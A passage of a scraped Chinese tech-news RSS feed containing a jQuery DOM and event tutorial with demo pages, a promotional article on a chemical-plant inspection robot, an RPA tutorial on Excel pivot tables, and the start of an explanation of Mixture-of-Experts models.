&lt;/
body
&gt;
&lt;/
html
&gt;
class操作
添加样式类：
$obj.addClass(name)
name：需要添加的样式类名，参数不要带点
移除样式类：
$obj.removeClass(name)
name：需要移除的样式类名
切换样式类：
$obj.toggleClass(name)
name：需要切换的样式类名，如果有，则移除该样式，如果没有，则添加该样式
判断是否有某个样式类：
$obj.hasClass(name)
name：用于判断的样式类名，返回值为true、false
&lt;!
DOCTYPE
html
&gt;
&lt;
html
lang
=
"
en
"
&gt;
&lt;
head
&gt;
&lt;
meta
charset
=
"
UTF-8
"
&gt;
&lt;
meta
name
=
"
viewport
"
content
=
"
width=device-width, initial-scale=1.0
"
&gt;
&lt;
title
&gt;
Document
&lt;/
title
&gt;
&lt;
style
&gt;
div
{
width
:
100px
;
height
:
100px
;
background-color
:
pink
;
margin-top
:
10px
;
}
.fontSize30
{
font-size
:
30px
;
}
&lt;/
style
&gt;
&lt;/
head
&gt;
&lt;
body
&gt;
&lt;
button
id
=
"
addClass
"
&gt;
添加类
&lt;/
button
&gt;
&lt;
button
id
=
"
moveClass
"
&gt;
移除类
&lt;/
button
&gt;
&lt;
button
id
=
"
hasClass
"
&gt;
判断类
&lt;/
button
&gt;
&lt;
button
id
=
"
toggleClass
"
&gt;
切换类
&lt;/
button
&gt;
&lt;
div
id
=
"
box
"
class
=
"
box1
"
&gt;
今天
&lt;/
div
&gt;
&lt;
div
class
=
"
box1
"
&gt;
明天
&lt;/
div
&gt;
&lt;
script
src
=
"
jquery-3.3.1.min.js
"
&gt;
&lt;/
script
&gt;
&lt;
script
&gt;
$
(
function
(
)
{
// 添加类
$
(
'#addClass'
)
.
click
(
function
(
)
{
$
(
'#box'
)
.
addClass
(
'fontSize30'
)
}
)
// 移除类
$
(
'#moveClass'
)
.
click
(
function
(
)
{
$
(
'#box'
)
.
removeClass
(
'fontSize30'
)
}
)
// 切换类
$
(
'#toggleClass'
)
.
click
(
function
(
)
{
$
(
'#box'
)
.
toggleClass
(
'fontSize30'
)
}
)
// 判断类
$
(
'#hasClass'
)
.
click
(
function
(
)
{
console
.
log
(
$
(
'#box1'
)
.
hasClass
(
'fontSize30'
)
)
}
)
}
)
&lt;/
script
&gt;
&lt;/
body
&gt;
&lt;/
html
&gt;
设置、获取文本内容
&lt;!
DOCTYPE
html
&gt;
&lt;
html
lang
=
"
en
"
&gt;
&lt;
head
&gt;
&lt;
meta
charset
=
"
UTF-8
"
&gt;
&lt;
meta
name
=
"
viewport
"
content
=
"
width=device-width, initial-scale=1.0
"
&gt;
&lt;
title
&gt;
Document
&lt;/
title
&gt;
&lt;/
head
&gt;
&lt;
body
&gt;
&lt;
input
type
=
"
button
"
value
=
"
获取
"
id
=
"
getBtn
"
&gt;
&lt;
input
type
=
"
button
"
value
=
"
设置
"
id
=
"
setBtn
"
&gt;
&lt;
div
id
=
"
div1
"
&gt;
我是div1标签
&lt;
p
&gt;
我是p1标签
&lt;
span
&gt;
我是span1标签
&lt;/
span
&gt;
&lt;/
p
&gt;
&lt;/
div
&gt;
&lt;
div
id
=
"
div1
"
&gt;
我是div2标签
&lt;
p
&gt;
我是p2标签
&lt;
span
&gt;
我是span2标签
&lt;/
span
&gt;
&lt;/
p
&gt;
&lt;/
div
&gt;
&lt;
script
src
=
"
jquery-3.3.1.min.js
"
&gt;
&lt;/
script
&gt;
&lt;
script
&gt;
$
(
function
(
)
{
// 获取
$
(
'#getBtn'
)
.
click
(
function
(
)
{
// 获取id为div1的标签的文本
console
.
log
(
$
(
'#div1'
)
.
text
(
)
)
// 获取div标签的文本
console
.
log
(
$
(
'div'
)
.
text
(
)
)
}
)
// 设置
$
(
'#setBtn'
)
.
click
(
function
(
)
{
// 给id为div1的标签设置文本
$
(
'#div1'
)
.
text
(
'我是超人&lt;b&gt;我可以飞&lt;/b&gt;'
)
// 给div标签设置文本
$
(
'div'
)
.
text
(
'哇哈哈哈'
)
}
)
}
)
&lt;/
script
&gt;
&lt;/
body
&gt;
&lt;/
html
&gt;
设置、获取表单内容
&lt;!
DOCTYPE
html
&gt;
&lt;
html
lang
=
"
en
"
&gt;
&lt;
head
&gt;
&lt;
meta
charset
=
"
UTF-8
"
&gt;
&lt;
meta
name
=
"
viewport
"
content
=
"
width=device-width, initial-scale=1.0
"
&gt;
&lt;
title
&gt;
Document
&lt;/
title
&gt;
&lt;/
head
&gt;
&lt;
body
&gt;
&lt;
input
type
=
"
text
"
placeholder
=
"
请输入内容
"
id
=
"
txt
"
&gt;
&lt;
input
type
=
"
password
"
placeholder
=
"
请输入密码
"
id
=
"
pwd
"
&gt;
&lt;
input
type
=
"
button
"
value
=
"
点击
"
id
=
"
btn
"
&gt;
&lt;
script
src
=
"
jquery-3.3.1.min.js
"
&gt;
&lt;/
script
&gt;
&lt;
script
&gt;
// 获取和设置表单元素的值: 在js中,用value 在jQuery中,用val()
$
(
'#btn'
)
.
click
(
function
(
)
{
// 获取
console
.
log
(
$
(
'#txt'
)
.
val
(
)
)
// 设置
console
.
log
(
$
(
'#txt'
)
.
val
(
'今天是个好日子'
)
)
}
)
// this.defaultVslue: 默认值
$
(
'#pwd'
)
.
on
(
'focus'
,
function
(
)
{
if
(
$
(
this
)
.
val
(
)
===
this
.
defaultVslue
)
{
$
(
this
)
.
val
(
)
}
}
)
$
(
'#pwd'
)
.
on
(
'blur'
,
function
(
)
{
if
(
$
(
this
)
.
val
(
)
===
''
)
{
$
(
this
)
.
val
(
this
.
defaultVslue
)
}
}
)
&lt;/
script
&gt;
&lt;/
body
&gt;
&lt;/
html
&gt;
jQuery操作属性
attr操作
设置单个属性：
$obj.attr(name,value)
name：需要对应的属性名
value：对应的属性值
设置多个属性：
$obj.arrt(obj)
obj(参数是一个对象，包含了需要设置的属性名和属性值)
获取属性：
$obj.attr(name)
name：需要获取的属性名称，返回对应的属性值
移除属性：
$obj.removeArrt(name)
name：需要移除的属性名
&lt;!
DOCTYPE
html
&gt;
&lt;
html
lang
=
"
en
"
&gt;
&lt;
head
&gt;
&lt;
meta
charset
=
"
UTF-8
"
&gt;
&lt;
meta
name
=
"
viewport
"
content
=
"
width=device-width, initial-scale=1.0
"
&gt;
&lt;
title
&gt;
Document
&lt;/
title
&gt;
&lt;
style
&gt;
img
{
display
:
block
;
margin-top
:
10px
;
}
&lt;/
style
&gt;
&lt;/
head
&gt;
&lt;
body
&gt;
&lt;
button
&gt;
关灯
&lt;/
button
&gt;
&lt;
button
&gt;
开灯
&lt;/
button
&gt;
&lt;
img
src
=
"
images/coder.jpg
"
alt
=
"
"
&gt;
&lt;
script
src
=
"
jquery-3.3.1.min.js
"
&gt;
&lt;/
script
&gt;
&lt;
script
&gt;
$
(
function
(
)
{
let
$btns
=
$
(
'button'
)
$btns
[
0
]
.
onclick
=
function
(
)
{
$
(
'body'
)
.
attr
(
'style'
,
'background-color: black'
)
}
$btns
[
1
]
.
onclick
=
function
(
)
{
$
(
'body'
)
.
attr
(
'style'
,
'background-color: white'
)
}
}
)
&lt;/
script
&gt;
&lt;/
body
&gt;
&lt;/
html
&gt;
prop操作：在jQuery1.6之后，对于checked、disabled、selected这类布尔类型的属性来说不能用attr方法，只能用prop方法
设置属性：
$(':checked').prop('checked',true)
获取属性：
$(':checked').prop('checked')
jquery动画
显示(show)与隐藏(hide)
，
滑入(slideDown)与滑出(slideUp)与切换(slideToggle)
，
淡入(fadeIn)与淡出(fadeOut)与切换(fadeToggle)
speed(可选)：动画的执行时间，如果不传，就没有动画效果。如果是slide和fade系列，会默认为normal
callback(可选)：执行完动画后执行的回调函数
&lt;!
DOCTYPE
html
&gt;
&lt;
html
lang
=
"
en
"
&gt;
&lt;
head
&gt;
&lt;
meta
charset
=
"
UTF-8
"
&gt;
&lt;
meta
name
=
"
viewport
"
content
=
"
width=device-width, initial-scale=1.0
"
&gt;
&lt;
title
&gt;
Document
&lt;/
title
&gt;
&lt;
style
&gt;
div
{
width
:
100px
;
height
:
100px
;
margin-top
:
10px
;
background-color
:
pink
;
}
&lt;/
style
&gt;
&lt;/
head
&gt;
&lt;
body
&gt;
&lt;
button
id
=
"
show
"
&gt;
显示
&lt;/
button
&gt;
&lt;
button
id
=
"
hide
"
&gt;
隐藏
&lt;/
button
&gt;
&lt;
button
id
=
"
toggle
"
&gt;
切换
&lt;/
button
&gt;
&lt;
div
id
=
"
box
"
&gt;
&lt;/
div
&gt;
&lt;
script
src
=
"
jquery-3.3.1.min.js
"
&gt;
&lt;/
script
&gt;
&lt;
script
&gt;
$
(
function
(
)
{
// 显示
$
(
'#show'
)
.
click
(
function
(
)
{
$
(
'#box'
)
.
show
(
1000
)
}
)
// 隐藏
$
(
'#hide'
)
.
click
(
function
(
)
{
$
(
'#box'
)
.
hide
(
1000
)
}
)
// 切换
$
(
'#toggle'
)
.
click
(
function
(
)
{
$
(
'#box'
)
.
toggle
(
1000
)
}
)
}
)
&lt;/
script
&gt;
&lt;/
body
&gt;
&lt;/
html
&gt;
自定义动画：
animation
$(selector).animate({params},[speed],[easing],[callback])
params：要执行动画的css属性，带数字 (必选)
speed：执行动画时间 (可选)
easing：执行效果，默认为swing (缓动)
callback：动画执行完后立即执行的回调函数 (可选)
&lt;!
DOCTYPE
html
&gt;
&lt;
html
lang
=
"
en
"
&gt;
&lt;
head
&gt;
&lt;
meta
charset
=
"
UTF-8
"
&gt;
&lt;
meta
http-equiv
=
"
X-UA-Compatible
"
content
=
"
IE=edge
"
&gt;
&lt;
meta
name
=
"
viewport
"
content
=
"
width=device-width, initial-scale=1.0
"
&gt;
&lt;
title
&gt;
Document
&lt;/
title
&gt;
&lt;
style
&gt;
.loading-wrap
{
position
:
fixed
;
top
:
0
;
right
:
0
;
bottom
:
0
;
left
:
0
;
z-index
:
9999
;
width
:
100%
;
height
:
100%
;
background-color
:
#374140
;
}
.loading-wrap .loading
{
display
:
flex
;
justify-content
:
space-between
;
position
:
relative
;
top
:
50%
;
left
:
50%
;
transform
:
translate
(
-50%
,
-50%
)
;
width
:
180px
;
height
:
20px
;
}
.loading-wrap .loading .circle1 .circle2 .circle3
{
width
:
20px
;
height
:
100%
;
background-color
:
#fff
;
border-radius
:
50%
;
animation
:
circle 1.5s infinite ease-in-out
;
opacity
:
0
;
}
@keyframes
circle
{
0%,100%
{
transform
:
scale
(
0
)
;
opacity
:
0
;
}
50%
{
transform
:
scale
(
1
,
2
)
;
opacity
:
1
;
}
}
.loading-wrap .loading .circle2
{
animation-delay
:
0.25s
;
}
.loading-wrap .loading .circle2
{
animation-delay
:
0.5s
;
}
&lt;/
style
&gt;
&lt;/
head
&gt;
&lt;
body
&gt;
&lt;
div
class
=
"
loading-wrap
"
&gt;
&lt;
div
class
=
"
loading
"
&gt;
&lt;
div
class
=
"
circle1
"
&gt;
111
&lt;/
div
&gt;
&lt;
div
class
=
"
circle2
"
&gt;
222
&lt;/
div
&gt;
&lt;
div
class
=
"
circle3
"
&gt;
333
&lt;/
div
&gt;
&lt;/
div
&gt;
&lt;/
div
&gt;
&lt;
script
src
=
"
jquery-3.3.1.min.js
"
&gt;
&lt;/
script
&gt;
&lt;
script
&gt;
window
.
onload
=
function
(
)
{
$
(
'.loading-wrap'
)
.
delay
(
600
)
.
fadeOut
(
'slow'
)
}
&lt;/
script
&gt;
&lt;/
body
&gt;
&lt;/
html
&gt;
动画列队与停止动画
在同一个元素上执行多个动画，那么对于这个动画来说，后面的动画会被放到动画队列中，等前面的动画执行完成了才会执行
stop (clearQueue,jumpToEnd) 停止动画效果
第一个参数：是否清除列队
第二个参数：是否跳转到最终结果
jQuery节点操作
创建节点：
$('html格式的字符串')
添加节点
append、appendTo
：在被选元素的结尾插入内容
prepend、prependTo
：在被选元素的开头插入内容
before
：在被选元素之后插入内容
after
：在被选元素之前插入内容
删除节点与克隆节点
empty()
：删除指定节点的所有元素，自身保留
remove()
：删除指定节点的所有元素，自身也删除
clone()
：复制匹配的元素，返回值为复制的新元素，和原来的元素没有任何关系了。即修改新元素，不会影响到原来的元素
jQuery尺寸和位置操作
width、height
：设置或获取width和高度，不包括内边距、外边距和边框
获取网页的可视区宽高：
$(window).width()
，
$(window).height()
innerWidth/innerHeight
：返回元素的宽度/高度(包括内边距)
outWidth()/outerHeight()
：返回元素的宽度/高度(包括内边距和边框)
outerWidth(true)/outerHeight(true)
：返回元素的宽度/高度（包括内边距、边框和外边距）
scrollTop、scrollLeft
：设置或获取滚动条的位置
获取页面被卷曲的宽高：
$(window).scrollLeft()
，
$(window).scrollTop()
offset、position
offset：获取元素距离document的位置，返回值为对象
position：获取元素距离有定位的父元素(offsetParent)的位置
jQuery事件机制
简单注册事件
click
：单击事件
mouseeter
：鼠标进入事件
mouseleave
：鼠标离开事件
注意：
以上三种点击事件都不能同时注册多个时间，不支持动态注册
bind方式注册事件：能同时注册多个事件，不支持动态注册
delegate注册委托事件：能同时注册多个事件，支持动态注册
on注册事件：jQuery1.7之后，jQuery用on统一了所有事件的处理方法
语法：
$(selector).on(events[,selector][,data],handler)
event：绑定事件的名称可以是由空格分隔的多个事件 (标准事件或者自定义事件)
selector：执行事件的后代元素 (可选)，如果没有后代元素，那么事件将自己执行
data：传递给处理函数的数据，事件触发的时候通过event.data来使用 (不常使用)
handle：事件处理函数
事件解绑
$(selector).off()
：解绑匹配元素的所有事件
$(selector).off(click)
：解绑指定的单击事件
注册事件委托
语法：
$(selector).on( 'click','span', function() {})
表示给$(selector)绑定代理事件，但必须是它的内部元素span才能触发这个事件，支持动态绑定
事件委托原理
为什么可以支持动态注册，因为原理是事件冒泡
为什么不是每一个子元素都冒泡呢，因为有过滤
jQuery事件对象
定义：jQuery对象其实就是js事件对象的一个封装，处理了浏览器兼容问题 (用事件参数e来获取)
clientX/clientY
：距离页面左上角的位置 (忽视滚动条)
pageX/pageY
：距离页面最顶部的左上角的位置 (会计算滚动条的位置)
screenX/screenY
：距离页面左上角的值
event.stopPropagation()
：阻止事件冒泡
event.preventDefault()
：阻止浏览器默认行为
return false
：既能阻止事件冒泡，又能阻止浏览器默认行为
event.keyCode
：按下的键盘代码
jQuery能够绑定的事件
鼠标事件
click
：鼠标单击时触发
dblclick()
：鼠标双击时触发
mouseenter
：鼠标进入时触发
mouseleave
：鼠标移除时触发
mousemove
：鼠标在dom内部移动式触发
hover
：鼠标进入和退出时触发两个函数，相当于mouseenter加上mouseleaver
键盘事件
键盘事件仅作用于当前焦点的dom上,通常是和
keydown
：键盘按下时触发
keyup
：键盘松开时触发
keypress
：按一次键后触发
其他事件
foucs
：当dom获得焦点时触发
blur
：当dom失去焦点时触发
change
：当,或的内容改变时触发
submit
：当提交时触发
ready
：当页面被载入并且dom树完成初始化后触发
ready仅作用于document对象，由于ready事件在dom完成初始化后触发，且只能触发一次，用来适合写其他的初始化代码
jQuery扩展
each方法
：遍历jQuery对象集合，为每一个匹配元素中的索引号
$(selector).each(function(index,element){})
链式编程
通常情况下，只有设置操作才能把链式编程延续下去。因为获取操作的时候，会返回获取到的相应的值，无法返回 jQuery对象
end()
：筛选选择器会改变jQuery对象的DOM对象，想要回复到上一次的状态，并且返回匹配元素之前的状态
多库共存
jQuery使用作为标示符，但是如果与其他框架中的冲突时，jQuery可以释放$符的控制权
let c = $.noConflict()
释放
的控制权，并且把 的控制权，并且把
的控制权，并且把
的能力给了c
插件
图片懒加载插件：https://github.com/tuupola/jquery_lazyload
提供的方法
serialize()
：得到的是一个字符串
serializeArry()
：得到的是一个数组</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540066.html</guid><pubDate>Fri, 31 Oct 2025 07:22:49 +0000</pubDate></item><item><title>智能新势力：防爆挂轨巡检机器人助力化工安全</title><link>https://www.ppmy.cn/news/1540067.html</link><description>在化工领域，传统巡检面临诸多难题。化工环境危险，有毒有害气体和易燃易爆物质威胁巡检人员安全，高温高压设备易引发意外。化工厂面积大，人工巡检效率低，难以全面覆盖。且人工检测易漏检隐蔽故障，记录数据易出错，管理难度大。而化工厂巡检机器人的出现，为解决这些问题带来了希望。让我们一同探索化工厂巡检机器人如何为化工企业安全生产保驾护航。
一、化工巡检机器人的技术原理
1、传感器技术
Ex2-C6防爆挂轨巡检机器人配备了先进的传感器系统，包括高精度的温度传感器、压力传感器以及气体传感器等。这些传感器能够实时准确地检测化工设备的运行状态和周围环境的变化。例如，温度传感器可以监测设备的温度是否异常升高，及时发现潜在的过热故障；气体传感器则能够快速检测出周围环境中是否存在有毒有害或可燃气体泄漏，为人员安全提供保障。
2、导航与定位技术
该机器人采用编码器+RFID导航技术，能够在复杂的化工环境中实现精准的定位和导航。挂轨设计使得机器人可以稳定地在预设轨道上运行，不受地面障碍物的影响。同时，通过高精度的定位系统，机器人可以准确地到达指定的巡检位置，确保对每一个关键部位进行细致的检查。
3、通信技术
Ex2-C6巡检机器人具备强大的通信功能，能够实现数据的稳定传输和实时监控。采用无线通信技术，机器人可以将采集到的设备状态和环境数据及时传输到控制中心，方便工作人员随时了解现场情况。同时，通信系统还具备高可靠性和抗干扰能力，确保在复杂的化工环境中数据传输的稳定性。
二、化工巡检机器人的功能与优势
1、功能
（1）设备状态监测
Ex2-C6机器人能够对化工设备的温度、压力、振动等关键参数进行实时监测。通过对这些参数的分析，可以及时发现设备的异常情况，如过热、压力过高或振动异常等，为设备的维护和保养提供依据。
（2）环境监测
机器人配备的气体传感器可以对化工生产环境中的有毒有害气体和可燃气体进行检测。一旦发现气体泄漏，机器人会立即发出报警信号，提醒工作人员采取相应的措施，避免安全事故的发生。
（3）异常情况报警
当机器人检测到设备故障或环境异常时，会通过声光报警等方式及时向工作人员发出警报。同时，机器人还可以将异常情况的详细信息传输到控制中心，方便工作人员快速定位问题并采取有效的解决措施。
2、优势
（1）提高安全性
Ex2-C6防爆挂轨巡检机器人可以代替人工在危险的化工环境中进行巡检工作，大大减少了人员暴露在有毒有害、易燃易爆环境中的风险。机器人的防爆设计确保了在危险区域的安全运行，为化工企业的安全生产提供了有力保障。
（2）提升巡检效率
机器人可以快速、准确地覆盖大面积的化工区域，大大提高了巡检效率。相比人工巡检，机器人可以在更短的时间内完成对更多设备和区域的检查，及时发现潜在的问题，降低生产事故的发生概率。
（3）数据准确性高
机器人采用先进的传感器和数据采集技术，能够确保数据的准确性和可靠性。避免了人工记录数据时可能出现的误差和遗漏，为化工企业的生产决策提供了科学依据。
（4）24小时不间断巡检
Ex2-C6机器人可以实现24小时不间断巡检，随时监测化工设备和环境的变化。这有助于及时发现问题并采取措施，确保化工生产的连续稳定进行。
三、化工巡检机器人的应用案例
在众多化工企业中，旗晟智能科技的Ex2-C6防爆挂轨巡检机器人已经得到了广泛的应用。例如，在某大型化工企业的生产车间，机器人成功地检测到了一处设备的微小泄漏，避免了可能发生的安全事故。在另一家化工企业，机器人通过对设备温度的实时监测，及时发现了一台设备的过热故障，为企业节省了大量的维修成本和时间。
Ex2-C6防爆挂轨巡检机器人以其先进的技术、强大的功能和显著的优势，成为化工领域的安全守护者。它不仅解决了传统巡检方式面临的诸多问题，还为化工企业的安全生产和智能化发展带来了新的机遇。展望未来，随着技术的不断进步和市场需求的不断增加，化工巡检机器人必将在化工行业中发挥更加重要的作用。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540067.html</guid><pubDate>Fri, 31 Oct 2025 07:22:50 +0000</pubDate></item><item><title>影刀RPA实战：Excel数据透视表指令</title><link>https://www.ppmy.cn/news/1540068.html</link><description>1.Excel数据透视表
Excel数据透视表是Excel中一个强大的数据分析工具，它能够快速对大量数据进行汇总、分析和呈现。用户可以通过简单的拖放操作，将数据字段分配到行标签、列标签、值和报表筛选器区域，实现数据的多维度分析。
创建数据透视表非常简单，只需选择数据区域，然后点击“插入”选项卡中的“数据透视表”按钮。在弹出的对话框中，可以选择将数据透视表放置在新工作表或现有工作表上。
数据透视表的字段列表允许用户将字段拖放到不同的区域，以不同的方式组织和分析数据。行标签和列标签用于数据的分组，而值区域则显示数据的汇总结果，如求和、平均值、计数等。此外，报表筛选器允许用户根据特定条件筛选数据，以进一步细化分析。
数据透视表还支持数据的分组、排序和筛选，以及多种预设样式的应用，使得数据的呈现更加直观和美观。如果原始数据发生变化，用户可以轻松刷新数据透视表，以确保分析结果的准确性。
总之，Excel数据透视表是一个功能丰富、操作简便的工具，它极大地简化了数据分析的过程，帮助用户快速从数据中获取有价值的信息。
数据透视表在分析数据方面的优势：
快速汇总大量数据
：数据透视表可以迅速处理成千上万条记录，自动进行求和、平均、计数等计算。
灵活性和动态性
：用户可以通过拖放字段轻松改变数据的汇总方式，数据透视表会即时更新以反映这些变化。
多维度分析
：可以同时分析数据的多个维度，如按地区、产品、时间等，以发现数据间的复杂关系。
交互性
：数据透视表允许用户进行交互式探索，如筛选、排序和分组，以深入理解数据。
数据可视化
：可以轻松地将数据透视表中的数据转换为图表，以直观展示分析结果。
自动更新
：当原始数据源发生变化时，数据透视表可以自动更新，确保分析结果的时效性。
减少错误
：由于数据透视表自动处理数据汇总，减少了手动计算可能引入的错误。
支持复杂计算
：可以创建自定义计算字段和使用复杂的计算，如百分比、差异、指数等。
数据钻取
：用户可以通过钻取功能查看数据的不同层次，从总体到细节，以获得更深入的洞察。
报表筛选
：可以轻松地添加筛选器来限制数据透视表中显示的数据，以进行更精确的分析。
数据整合
：可以整合来自不同数据源的数据，进行跨数据源的分析。
节省时间
：对于需要频繁进行相同类型分析的用户，创建一次数据透视表后，可以重复使用，大大节省时间。
2.实战目标
本次实战主要介绍使用影刀RPA操作Excel数据透视表。实现数据汇总，筛选即设置切片器。
演示销售数据基础表：
数据透视表：
3.实战步骤
3.1 指令说明
3.1.1 新建数据透视表
功能：
依据数据源创建数据透视表，该指令的设置难点是透视表设置，主要接收的参数是JSON字符串，使用时，最好先在Excel中创建数据透视表，然后使用“在Excel内指出”功能获取数据透视表的配置字符串，获取后点击确定，配置字符串会自动回显。
Excel对象
：选择一个之前通过【打开/新建Excel】或【获取当前激活的Excel对象】指令创建的Excel对象
透视表设置
：透视表的设置信息，可以在Excel中建好数据透视表后，通过「在Excel内指出」拾取设置信息
数据源：
「在Excel内指出」可同步拾取到已有透视表的数据源，可在此基础上作修改
3.1.2 筛选数据透视表
功能：
用于设置数据透视表中筛选器
Excel对象：
选择一个之前通过【打开/新建Excel】或【获取当前激活的Excel对象】指令创建的Excel对象
所在Sheet页名称
：指定要刷新的数据透视表所在的Sheet页，选填，默认为当前激活的Sheet页
透视表名称或位置：
若相应Sheet页中只有一张数据透视表，直接填1即可，若有多张，可指定名称，也可通过「在Excel中指出」拾取数据透视表名称
筛选器名称：
设置筛选器名称
选择方式：
全部选择/部分选择
筛选器内容：
指定要筛选的内容，仅在部分选择时生效
3.1.3 刷新数据透视表
功能：
当数据透视表引用的数据或数据源源发生改变时，刷新数据透视表同步数据
Excel对象：
选择一个之前通过【打开/新建Excel】或【获取当前激活的Excel对象】指令创建的Excel对象
所在Sheet页名称：
指定要刷新的数据透视表所在的Sheet页，选填，默认为当前激活的Sheet页
透视表名称或位置：
若相应Sheet页中只有一张数据透视表，直接填1即可，若有多张，可指定名称，也可通过「在Excel中指出」拾取数据透视表名称
3.1.4 刷新透视表
功能：
该指令实现在刷新指定 sheet 透视表的功能
Excel 对象:
excel_instance, 选择通过【启动Excel】或【获取当前激活的Excel】指令创建的Excel对象
Sheet页名称:
字符串, 选填, 默认为当前激活的 Sheet 页
3.15 设置切片器
功能：
该指令通过接口在工作簿的透视表中插入切片器
Excel 对象:
excel_instance, 选择通过【启动Excel】或【获取当前激活的Excel】指令创建的Excel对象
切片器名称:
字符串, 切片器的名称, 一般为, "切片器_xx"(在切片器名称加上切片器_)
项名称:
字符串, 需要设置的项, 如, 西瓜
勾选:
复选框, 默认, 勾选
3.2 实战代码
3.2.1 新建数据透视表
目标：新增sheet工资表，命名销售金额汇总，将生成的透视表存放到单元格区域A3:B13
配置字符串：
在字符串中我们需要修改的又以下几个地方：
sheetName：存放数据透视表的工作表名称
tableRange：存放数据透视表的工作表中的单元格区域
name：数据透视表的名称，
{"sourceType": 1,"sheetName": "销售金额汇总","tableRange": "A3:B13","name": "数据透视表1","properties": [{"name": "ColumnGrand","value": true}, {"name": "RowGrand","value": true}, {"name": "SubtotalHiddenPageItems","value": false}, {"name": "InGridDropZones","value": false}, {"name": "LayoutRowDefault","value": 0}, {"name": "DisplayFieldCaptions","value": true}, {"name": "ShowDrillIndicators","value": true}, {"name": "DisplayContextTooltips","value": true}, {"name": "SortUsingCustomLists","value": true}, {"name": "DisplayImmediateItems","value": true}, {"name": "FieldListSortAscending","value": false}, {"name": "ShowValuesRow","value": false}],"fields": [{"name": "销售人员","index": "1","formula": null,"customName": "销售人员","subtotals": [true, false, false, false, false, false, false, false, false, false, false, false],"props": [{"name": "Orientation","value": 1}, {"name": "ShowAllItems","value": false}, {"name": "EnableItemSelection","value": true}]}, {"name": "订购额","index": "1","formula": "","customName": "求和项:订购额","subtotals": [],"props": [{"name": "Orientation","value": 4}, {"name": "ShowAllItems","value": false}, {"name": "Calculation","value": -4143}, {"name": "Function","value": -4157}, {"name": "NumberFormat","value": "General"}]}]
}
演示：
3.2.2 筛选数据透视表
目标：在新建的数据透视中筛选销售人员
演示：
如果要筛选多级，就多复制指令，与一般的筛选操作一样
4.注意事项
生成数据透视表前，做好先做一个模版，我们通过指令获取配置信息，然后再依据实际需求修改，一般需要修改的地方有，数据透视表存放sheet页，存放单元格区域，如果你要改数据透视表名称的需求，也可以修改，数据透视表基础数据源区域的修改。
大多数情况下，我们都是从ERP中导出数据，然后生成数据透视表，有时候我们可能生成多个，这个时候我们就需要拿出时间，把数据透视表的设置字符串都获取到，然后存放到数据库中，或是数据表中，包括数据源，考虑他的延展行，避免丢数据，这样导出数据后，我们就可以通过循环制作每一个数据透视表。
在制作的过程，可能报错：pywintypes.com_error
pywintypes.com_error: (-2147352567, '发生意外。', (0, None, None, None, 0, -2147024809), None)
这个错误，是excel进程有残留，我们必须把他全部杀死，所以，运行前，我们使用终止程序指令杀死全部excel进程。如果还是不行，就的重启电脑了。
5.最后
感谢大家，请大家多多支持！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540068.html</guid><pubDate>Fri, 31 Oct 2025 07:22:53 +0000</pubDate></item><item><title>深度学习架构：MOE架构</title><link>https://www.ppmy.cn/news/1540069.html</link><description>文章目录
1. MOE的核心思想
2. 数学原理推导
a. 输入到输出的流动
b. 门控网络（Gating Network）
c. 稀疏门控与稀疏选择
3. MOE 的训练过程
4. MOE的优势
5. MOE的应用
6. 总结
🍃作者介绍：双非本科大四网络工程专业在读，阿里云专家博主，专注于Java领域学习，擅长web应用开发，目前开始人工智能领域相关知识的学习
🦅个人主页：@逐梦苍穹
📕所属专栏：人工智能
🌻gitee地址：xzl的人工智能代码仓库
✈ 您的一键三连，是我创作的最大动力🌹
MOE（Mixture of Experts，专家混合模型）是一种深度学习中的网络架构，
旨在通过动态选择部分专家（子模型）参与推理任务，从而提高模型的计算效率和性能。
MOE架构尤其适用于大型神经网络模型的训练和推理，它能够在保持高性能的同时，显著降低计算成本。
谷歌的Switch Transformer
等模型便采用了MOE架构。
MOE模型通过门控机制（gating mechanism）在众多专家网络中选择少数几个与当前输入最相关的专家进行推理，而不是让所有专家都参与计算。
这种选择性的激活方式使得MOE模型在处理大规模任务时更为高效。
1. MOE的核心思想
MOE的基本思想是将模型划分为多个
专家网络
，每个专家是一个子模型，而不是所有子模型都参与计算。
对于每个输入样本，模型会选择一小部分专家来处理输入，而其他专家保持不激活。
这个选择过程由一个门控网络（gating network）控制，它根据输入样本决定最相关的专家。
主要组件
专家（Expert）
：多个独立的神经网络子模型，可以是全连接层、卷积层、Transformer层等。
门控网络（Gating Network）
：门控网络根据输入动态地选择参与计算的专家子集。每个输入都可能激活不同的专家子集。
2. 数学原理推导
综合公式为：
y = ∑ i = 1 N exp ⁡ ( W g T x ) i ∑ j = 1 N exp ⁡ ( W g T x ) j E i ( x ) , ( i , j ∈ Top-K ( G ( x ) , k ) ) y = \sum_{i=1}^N \frac{\exp(W_g^T x)_i}{\sum_{j=1}^N \exp(W_g^T x)_j} E_i(x),(i,j \in {\text{Top-K}(G(x), k)})
y
=
∑
i
=
1
N
​
∑
j
=
1
N
​
e
x
p
(
W
g
T
​
x
)
j
​
e
x
p
(
W
g
T
​
x
)
i
​
​
E
i
​
(
x
)
,
(
i
,
j
∈
Top-K
(
G
(
x
)
,
k
)
)
a. 输入到输出的流动
假设模型有
N N
N
个专家，每个专家都是一个子网络
E i ( x ) E_i(x)
E
i
​
(
x
)
，其中
x x
x
是输入。
MOE模型的输出可以表示为所有专家输出的加权和：
y = ∑ i = 1 N G ( x ) i E i ( x ) y = \sum_{i=1}^N G(x)_i E_i(x)
y
=
∑
i
=
1
N
​
G
(
x
)
i
​
E
i
​
(
x
)
其中，
G ( x ) i G(x)_i
G
(
x
)
i
​
是门控网络为第
i i
i
个专家分配的权重，表示该专家对当前输入的贡献。
G ( x ) G(x)
G
(
x
)
是门控网络生成的权重向量，通常通过 softmax 函数进行归一化，使得
∑ i = 1 N G ( x ) i = 1 \sum_{i=1}^N G(x)_i = 1
∑
i
=
1
N
​
G
(
x
)
i
​
=
1
。
b. 门控网络（Gating Network）
门控网络
G ( x ) G(x)
G
(
x
)
的作用是根据输入
x x
x
选择最合适的专家参与计算。
门控网络通常是一个小型的全连接网络，输入为
x x
x
，输出为长度为
N N
N
的权重向量。
每个权重代表对应专家的相关性。
门控网络的输出可以表示为：
G ( x ) i = exp ⁡ ( W g T x ) i ∑ j = 1 N exp ⁡ ( W g T x ) j G(x)_i = \frac{\exp(W_g^T x)_i}{\sum_{j=1}^N \exp(W_g^T x)_j}
G
(
x
)
i
​
=
∑
j
=
1
N
​
e
x
p
(
W
g
T
​
x
)
j
​
e
x
p
(
W
g
T
​
x
)
